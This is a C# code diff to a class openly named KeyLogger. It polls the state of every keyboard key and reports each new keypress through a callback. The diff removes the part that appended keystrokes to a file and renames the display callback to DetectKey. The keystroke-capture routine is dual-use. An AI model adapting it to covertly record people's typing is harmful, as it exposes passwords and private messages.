@@ -3,8 +3,6 @@ using System.Windows.Input;
 using System.Threading.Tasks;
 using System.Windows.Threading;
 using System.Collections.Generic;
-using System.IO;
-using System.Text;
 
 namespace keylogger
 {
@@ -12,13 +10,9 @@ namespace keylogger
     {           
         private Dictionary<Key, bool> Keys;
 
-        public bool Start { get; private set; }
+        public bool Start { get; private set; }    
 
-        public Action<StreamWriter, Key>? SaveToFile;
-
-        public Action<Key>? Show;
-
-        public string? FilePath;
+        public Action<Key>? DetectKey;
 
         public KeyLogger()
         {
@@ -27,9 +21,7 @@ namespace keylogger
             {
                 Keys.Add((Key)i, true);
             }
-            Start = false;            
-            SaveToFile = null;
-            FilePath = null;
+            Start = false;             
         }
 
         public void KeyHook(Dispatcher dispatcher)
@@ -49,17 +41,10 @@ namespace keylogger
                             {
                                 if (Keyboard.IsKeyDown(key.Key) && key.Value == true)
                                 {
-                                    if (Show != null)
+                                    if (DetectKey != null)
                                     {
-                                        Show(key.Key);
-                                    }
-                                    if (SaveToFile != null && FilePath != null)
-                                    {
-                                        using (var sw = new StreamWriter(FilePath, true, Encoding.UTF8))
-                                        {
-                                            SaveToFile(sw, key.Key);
-                                        }
-                                    }
+                                        DetectKey(key.Key);
+                                    }                                    
                                     Keys[key.Key] = false;
                                 }
                                 if (Keyboard.IsKeyUp(key.Key))
